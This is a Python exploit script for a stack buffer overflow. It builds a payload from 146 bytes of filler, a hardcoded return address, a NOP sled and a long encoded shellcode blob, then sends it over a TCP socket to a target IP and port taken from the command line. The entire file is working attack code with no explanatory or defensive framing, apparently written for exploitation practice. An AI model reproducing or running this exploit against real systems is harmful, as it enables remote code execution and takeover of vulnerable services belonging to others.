#!/usr/bin/env python3

import sys, socket

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

filler = 'A'*146
ret = '\xC3\x14\x04\x08'
nops = '\x90'*10

shellcode =  ""
shellcode += "\xbd\x41\xb3\x04\x12\xda\xc4\xd9\x74\x24\xf4\x5e"
shellcode += "\x31\xc9\xb1\x52\x31\x6e\x12\x83\xee\xfc\x03\x2f"
shellcode += "\xbd\xe6\xe7\x53\x29\x64\x07\xab\xaa\x09\x81\x4e"
shellcode += "\x9b\x09\xf5\x1b\x8c\xb9\x7d\x49\x21\x31\xd3\x79"
shellcode += "\xb2\x37\xfc\x8e\x73\xfd\xda\xa1\x84\xae\x1f\xa0"
shellcode += "\x06\xad\x73\x02\x36\x7e\x86\x43\x7f\x63\x6b\x11"
shellcode += "\x28\xef\xde\x85\x5d\xa5\xe2\x2e\x2d\x2b\x63\xd3"
shellcode += "\xe6\x4a\x42\x42\x7c\x15\x44\x65\x51\x2d\xcd\x7d"
shellcode += "\xb6\x08\x87\xf6\x0c\xe6\x16\xde\x5c\x07\xb4\x1f"
shellcode += "\x51\xfa\xc4\x58\x56\xe5\xb2\x90\xa4\x98\xc4\x67"
shellcode += "\xd6\x46\x40\x73\x70\x0c\xf2\x5f\x80\xc1\x65\x14"
shellcode += "\x8e\xae\xe2\x72\x93\x31\x26\x09\xaf\xba\xc9\xdd"
shellcode += "\x39\xf8\xed\xf9\x62\x5a\x8f\x58\xcf\x0d\xb0\xba"
shellcode += "\xb0\xf2\x14\xb1\x5d\xe6\x24\x98\x09\xcb\x04\x22"
shellcode += "\xca\x43\x1e\x51\xf8\xcc\xb4\xfd\xb0\x85\x12\xfa"
shellcode += "\xb7\xbf\xe3\x94\x49\x40\x14\xbd\x8d\x14\x44\xd5"
shellcode += "\x24\x15\x0f\x25\xc8\xc0\x80\x75\x66\xbb\x60\x25"
shellcode += "\xc6\x6b\x09\x2f\xc9\x54\x29\x50\x03\xfd\xc0\xab"
shellcode += "\xc4\xc2\xbd\xc7\x95\xab\xbf\x27\x97\x90\x49\xc1"
shellcode += "\xfd\xf6\x1f\x5a\x6a\x6e\x3a\x10\x0b\x6f\x90\x5d"
shellcode += "\x0b\xfb\x17\xa2\xc2\x0c\x5d\xb0\xb3\xfc\x28\xea"
shellcode += "\x12\x02\x87\x82\xf9\x91\x4c\x52\x77\x8a\xda\x05"
shellcode += "\xd0\x7c\x13\xc3\xcc\x27\x8d\xf1\x0c\xb1\xf6\xb1"
shellcode += "\xca\x02\xf8\x38\x9e\x3f\xde\x2a\x66\xbf\x5a\x1e"
shellcode += "\x36\x96\x34\xc8\xf0\x40\xf7\xa2\xaa\x3f\x51\x22"
shellcode += "\x2a\x0c\x62\x34\x33\x59\x14\xd8\x82\x34\x61\xe7"
shellcode += "\x2b\xd1\x65\x90\x51\x41\x89\x4b\xd2\x71\xc0\xd1"
shellcode += "\x73\x1a\x8d\x80\xc1\x47\x2e\x7f\x05\x7e\xad\x75"
shellcode += "\xf6\x85\xad\xfc\xf3\xc2\x69\xed\x89\x5b\x1c\x11"
shellcode += "\x3d\x5b\x35"


total = filler + ret + nops + shellcode + '\r\n'

try:
	print("Sending buffer..")
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect((host, port)) # Connect to user supplied port and IP address	
	client.send(total.encode('latin-1'))
	print(client.recv(1024))

except:
	print("Cannot connect!")
	sys.exit(0)

client.close()
